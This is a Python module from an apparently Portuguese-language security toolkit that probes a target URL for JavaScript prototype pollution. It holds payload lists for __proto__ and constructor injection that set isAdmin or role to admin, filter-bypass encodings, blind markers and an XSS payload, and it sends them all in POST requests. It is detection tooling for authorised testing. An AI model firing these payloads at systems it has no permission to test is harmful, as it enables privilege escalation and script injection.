#!/usr/bin/env python3
"""Modulo de deteccao de Prototype Pollution.

Testa se o servidor e vulneravel a prototype pollution via:
  - __proto__ — injecao direta em prototypes de objetos JS
  - constructor.prototype — via construtor de objetos
  - bypass — encoding e variantes para contornar filtros
  - blind — detecao cega via timing/reflection
  - impact — teste de impacto concreto (isAdmin, role, settings)

Fluxo:
  1. Envia payloads de prototype pollution em parametros de entrada
  2. Verifica se a resposta indica prototype modificado
  3. Se detectado, testa impacto concreto
  4. Classifica: detectado, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparse
import logging
import time
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.prototypepollution")

_CATEGORY_MAP: dict[str, list[str]] = {
    "detect": ["proto_basic", "proto_admin", "proto_role", "proto_settings", "proto_version"],
    "constructor": ["ctor_basic", "ctor_admin", "ctor_role", "ctor_proto", "ctor_inject"],
    "bypass": ["url_encode", "double_encode", "nested", "array_bracket", "dot_notation"],
    "blind": ["blind_timing", "blind_reflection", "blind_stored", "blind_header", "blind_cookie"],
    "impact": ["impact_isadmin", "impact_role", "impact_settings", "impact_rce", "impact_xss"],
}

_DETECT_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "proto_basic",
        '{"__proto__":{"polluted":true}}',
        ["polluted", "true", "__proto__"],
    ),
    (
        "proto_admin",
        '{"__proto__":{"isAdmin":true}}',
        ["isAdmin", "true", "admin"],
    ),
    (
        "proto_role",
        '{"__proto__":{"role":"admin"}}',
        ["role", "admin"],
    ),
    (
        "proto_settings",
        '{"__proto__":{"settings":{"debug":true}}}',
        ["settings", "debug", "true"],
    ),
    (
        "proto_version",
        '{"__proto__":{"version":"9.9.9"}}',
        ["version", "9.9.9"],
    ),
]

_CONSTRUCTOR_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "ctor_basic",
        '{"constructor":{"prototype":{"polluted":true}}}',
        ["polluted", "true", "prototype"],
    ),
    (
        "ctor_admin",
        '{"constructor":{"prototype":{"isAdmin":true}}}',
        ["isAdmin", "true"],
    ),
    (
        "ctor_role",
        '{"constructor":{"prototype":{"role":"admin"}}}',
        ["role", "admin"],
    ),
    (
        "ctor_proto",
        '{"constructor":{"prototype":{"__proto__":{"polluted":true}}}}',
        ["polluted", "true", "__proto__"],
    ),
    (
        "ctor_inject",
        '{"constructor":{"prototype":{"toString":"polluted"}}}',
        ["toString", "polluted"],
    ),
]

_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "url_encode",
        "%5B__proto__%5D%5Bpolluted%5D=true",
        ["polluted", "true", "__proto__"],
    ),
    (
        "double_encode",
        "%255B__proto__%255D%255Bpolluted%255D=true",
        ["polluted", "true", "__proto__"],
    ),
    (
        "nested",
        '{"__proto__":{"__proto__":{"polluted":true}}}',
        ["polluted", "true", "__proto__"],
    ),
    (
        "array_bracket",
        "__proto__[polluted]=true",
        ["polluted", "true", "__proto__"],
    ),
    (
        "dot_notation",
        "__proto__.polluted=true",
        ["polluted", "true", "__proto__"],
    ),
]

_BLIND_PAYLOADS: list[tuple[str, str, str, list[str]]] = [
    (
        "blind_timing",
        '{"__proto__":{"timeout":999999}}',
        "timeout",
        ["timeout", "999999"],
    ),
    (
        "blind_reflection",
        '{"__proto__":{"reflected":"PP_TEST_7X9K2"}}',
        "PP_TEST_7X9K2",
        ["PP_TEST_7X9K2"],
    ),
    (
        "blind_stored",
        '{"__proto__":{"stored":"PP_STORED_3M8N5"}}',
        "stored",
        ["PP_STORED_3M8N5"],
    ),
    (
        "blind_header",
        '{"__proto__":{"x-custom-header":"PP_HDR_4L6P1"}}',
        "x-custom-header",
        ["PP_HDR_4L6P1"],
    ),
    (
        "blind_cookie",
        '{"__proto__":{"session":"PP_SESS_2K7W9"}}',
        "session",
        ["PP_SESS_2K7W9"],
    ),
]

_IMPACT_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "impact_isadmin",
        '{"__proto__":{"isAdmin":true}}',
        ["isAdmin", "true", "admin", "authorized"],
    ),
    (
        "impact_role",
        '{"__proto__":{"role":"admin"}}',
        ["role", "admin", "administrator"],
    ),
    (
        "impact_settings",
        '{"__proto__":{"settings":{"debug":true,"admin":true}}}',
        ["settings", "debug", "admin", "true"],
    ),
    (
        "impact_rce",
        '{"__proto__":{"child_process":{}}}',
        ["child_process", "exec", "spawn"],
    ),
    (
        "impact_xss",
        '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
        ["innerHTML", "alert", "onerror"],
    ),
]

_SSI_PARAMS: list[str] = [
    "data", "json", "payload", "input", "value",
    "content", "body", "params", "query", "config",
    "options", "settings", "item", "object", "model",
]


@dataclass(frozen=True, slots=True)
class PollAttempt:
    """Tentativa individual de Prototype Pollution."""
    technique: str
    category: str
    payload: str
    param: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str


@dataclass(frozen=True, slots=True)
class PollResult:
    """Resultado consolidado do scan de Prototype Pollution."""
    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[PollAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


def _check_poll_response(body: bytes, status: int, indicators: list[str]) -> bool:
    """Verifica se a resposta indica prototype pollution."""
    if status == 0:
        return False
    text = body.decode("utf-8", errors="ignore").lower()
    return any(ind.lower() in text for ind in indicators)


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia request baseline para obter tamanho e status de referencia."""
    try:
        resp = await client.get(url, follow_redirects=True)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


async def _test_detect(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa payloads de deteccao de prototype pollution."""
    b_status, b_size, _ = baseline
    results: list[PollAttempt] = []

    for technique, payload, indicators in _DETECT_PAYLOADS:
        for param in _SSI_PARAMS[:4]:
            try:
                json_data = {param: payload}
                resp = await client.post(url, json=json_data, follow_redirects=True)
                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
                results.append(PollAttempt(
                    technique=technique,
                    category="detect",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(PollAttempt(
                    technique=technique,
                    category="detect",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_constructor(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa payloads de constructor prototype pollution."""
    b_status, b_size, _ = baseline
    results: list[PollAttempt] = []

    for technique, payload, indicators in _CONSTRUCTOR_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                json_data = {param: payload}
                resp = await client.post(url, json=json_data, follow_redirects=True)
                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
                results.append(PollAttempt(
                    technique=technique,
                    category="constructor",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(PollAttempt(
                    technique=technique,
                    category="constructor",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_bypass(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa payloads de bypass de filtros."""
    b_status, b_size, _ = baseline
    results: list[PollAttempt] = []

    for technique, payload, indicators in _BYPASS_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                json_data = {param: payload}
                resp = await client.post(url, json=json_data, follow_redirects=True)
                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
                results.append(PollAttempt(
                    technique=technique,
                    category="bypass",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(PollAttempt(
                    technique=technique,
                    category="bypass",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_blind(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa payloads de detecção cega (timing, reflection)."""
    b_status, b_size, _ = baseline
    results: list[PollAttempt] = []

    for technique, payload, _field, indicators in _BLIND_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                if technique == "blind_timing":
                    t0 = time.monotonic()
                    resp = await client.post(url, json={param: payload}, follow_redirects=True)
                    elapsed = time.monotonic() - t0
                    vulnerable = elapsed > 2.0
                else:
                    resp = await client.post(url, json={param: payload}, follow_redirects=True)
                    vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)

                results.append(PollAttempt(
                    technique=technique,
                    category="blind",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(PollAttempt(
                    technique=technique,
                    category="blind",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_impact(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[PollAttempt]:
    """Testa impacto concreto de prototype pollution."""
    b_status, b_size, _ = baseline
    results: list[PollAttempt] = []

    for technique, payload, indicators in _IMPACT_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                json_data = {param: payload}
                resp = await client.post(url, json=json_data, follow_redirects=True)
                vulnerable = _check_poll_response(resp.content, resp.status_code, indicators)
                results.append(PollAttempt(
                    technique=technique,
                    category="impact",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(PollAttempt(
                    technique=technique,
                    category="impact",
                    payload=payload,
                    param=param,
                    method="post_json",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


def print_results(result: PollResult) -> None:
    """Exibe os resultados do scan de Prototype Pollution."""
    vuln = [a for a in result.attempts if a.vulnerable]
    blocked = [a for a in result.attempts if a.error and "403" in a.error]

    if vuln:
        print(color("\n[!] VULNERABILIDADES DETECTADAS:", Cyber.RED, Cyber.BOLD))
        for v in vuln:
            print(color(f"  [!] {v.technique} via {v.param}", Cyber.RED))
            print(f"      Payload: {v.payload[:80]}...")
            if v.details:
                print(f"      Detalhes: {v.details}")
    else:
        print(color("\n  [+] Nenhuma Prototype Pollution detectada", Cyber.GREEN, Cyber.BOLD))

    if blocked:
        print(color(f"\n  [*] {len(blocked)} payloads bloqueados (403/429)", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error and "403" not in a.error]
    if errors:
        print(color(f"\n  [-] {len(errors)} erros de conexao", Cyber.GRAY))

    print(color(f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis", Cyber.WHITE))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: float,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
) -> int:
    """Executa o scan de Prototype Pollution."""
    logger.info("Prototype Pollution scan para %s", target)

    async with create_async_client(timeout=timeout) as client:
        b_status, b_size, _ = await _test_baseline(client, target)
        if b_status == 0:
            print(color("[-] Nao foi possivel conectar ao alvo", Cyber.RED))
            return 1

        print(color(f"[*] Baseline: status={b_status}, size={b_size}", Cyber.CYAN))

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())
        all_attempts: list[PollAttempt] = []

        for cat in test_categories:
            if cat == "detect":
                attempts = await _test_detect(client, target, (b_status, b_size, b""))
            elif cat == "constructor":
                attempts = await _test_constructor(client, target, (b_status, b_size, b""))
            elif cat == "bypass":
                attempts = await _test_bypass(client, target, (b_status, b_size, b""))
            elif cat == "blind":
                attempts = await _test_blind(client, target, (b_status, b_size, b""))
            elif cat == "impact":
                attempts = await _test_impact(client, target, (b_status, b_size, b""))
            else:
                continue
            all_attempts.extend(attempts)

        vulnerable = [a for a in all_attempts if a.vulnerable]
        blocked = [a for a in all_attempts if a.error and "403" in a.error]
        issues = [f"VULN: {a.technique} via {a.param}" for a in vulnerable]

        result = PollResult(
            target=target,
            baseline_status=b_status,
            baseline_size=b_size,
            tls=target.startswith("https"),
            attempts=all_attempts,
            vulnerable_techniques=[a.technique for a in vulnerable],
            blocked_techniques=[a.technique for a in blocked],
            issues=issues,
            overall_status="vulnerable" if vulnerable else "secure",
        )

        print_results(result)

        if output_file:
            write_output(output_file, asdict(result))
            logger.info("Resultados salvos em %s", output_file)

        return 1 if vulnerable else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""
    art = r"""
   ___  ___  ___   __  __            _     _                         _
  / _ \ / _ \|__  |  \/  | ___  _ __| |__ (_)_ __   __ _    ___ _ __ | |_
 | | | | | | | / /| |\/| |/ _ \| '__| '_ \| | '_ \ / _` |  / _ \ '_ \| __|
 | |_| | |_| |/ / | |  | | (_) | |  | |_) | | | | | (_| | |  __/ | | | |_
  \___/ \___/____/  |_|  |_|\___/|_|  |_.__/|_|_| |_|\__, |  \___|_| |_|\__|
                                                       |___/
"""
    create_banner(art, "   prototype pollution: detect __proto__ injection")()


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-protopoll",
        description="Prototype Pollution — detecta injecao em prototypes de objetos JS",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument(
        "-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument("--concurrency", type=int, default=5, help="Requisicoes simultaneas (default: 5)")
    add_common_args(parser)
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan Prototype Pollution a partir de argumentos parseados."""
    logger.info("Prototype Pollution scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="protopoll> ",
        description="Prototype Pollution interativo.",
        example="https://target.com -c detect",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c detect\n"
            "  https://target.com -c constructor\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
